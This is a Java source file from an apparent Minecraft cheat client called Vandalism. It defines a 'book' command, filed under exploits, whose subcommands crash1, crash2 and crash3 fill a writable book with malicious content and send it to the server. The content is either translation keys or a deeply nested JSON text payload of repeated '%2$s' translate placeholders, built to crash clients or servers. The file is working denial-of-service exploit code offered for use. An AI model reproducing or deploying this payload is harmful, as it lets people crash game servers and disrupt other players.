/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.command.impl.exploit;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import de.nekosarekawaii.vandalism.feature.command.AbstractCommand;
import de.nekosarekawaii.vandalism.util.game.ChatUtil;
import net.minecraft.command.CommandSource;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class BookCommand extends AbstractCommand {

    public BookCommand() {
        super("Turns writable book into funny book",
                Category.EXPLOIT,
                "book");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder
                .then(literal("crash1").then(argument("title", StringArgumentType.string()).executes(context -> crashBook1(StringArgumentType.getString(context, "title"), "translation.test.invalid"))))
                .then(literal("crash2").then(argument("title", StringArgumentType.string()).executes(context -> crashBook1(StringArgumentType.getString(context, "title"), "translation.test.invalid2"))))
                .then(literal("crash3").then(argument("title", StringArgumentType.string()).then(argument("size", IntegerArgumentType.integer(1, 40)).executes(context -> crashBook2(StringArgumentType.getString(context, "title"), IntegerArgumentType.getInteger(context, "size"))))));
    }

    private int crashBook1(String title, String translation) {
        if(!mc.player.isHolding(Items.WRITABLE_BOOK)) {
            ChatUtil.errorChatMessage("You need to hold a writable book in your hand.");
            return SINGLE_SUCCESS;
        }

        List<String> pages = new ArrayList<>();
        pages.add(Text.Serialization.toJsonString(Text.translatable(translation)));
        mc.getNetworkHandler().getConnection().channel.writeAndFlush(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
        return SINGLE_SUCCESS;
    }

    private int crashBook2(String title, int size) {
        if(!mc.player.isHolding(Items.WRITABLE_BOOK)) {
            ChatUtil.errorChatMessage("You need to hold a writable book in your hand.");
            return SINGLE_SUCCESS;
        }
        int repetitions = size; //max 40

        StringBuilder jsonBuilder = new StringBuilder("{\"translate\":\"");
        for (int i = 0; i < repetitions; i++) {
            jsonBuilder.append("%2$s");
        }
        jsonBuilder.append("\",\"with\":[\"\"");

        for (int i = 0; i < repetitions; i++) {
            jsonBuilder.append(",{\"translate\":\"");
            for (int j = 0; j < repetitions; j++) {
                jsonBuilder.append("%2$s");
            }
            jsonBuilder.append("\",\"with\":[\"\"");
        }

        jsonBuilder.append(",{\"translate\":\"");
        for (int i = 0; i < repetitions; i++) {
            jsonBuilder.append("%2$s");
        }
        jsonBuilder.append("\",\"with\":[\"txsla\", \"txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_\"]}]}");

        for (int i = 0; i < repetitions; i++) {
            jsonBuilder.append("]}");
        }

        List<String> pages = new ArrayList<>();
        pages.add(jsonBuilder.toString());

        mc.getNetworkHandler().getConnection().channel.writeAndFlush(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
        return SINGLE_SUCCESS;
    }
}
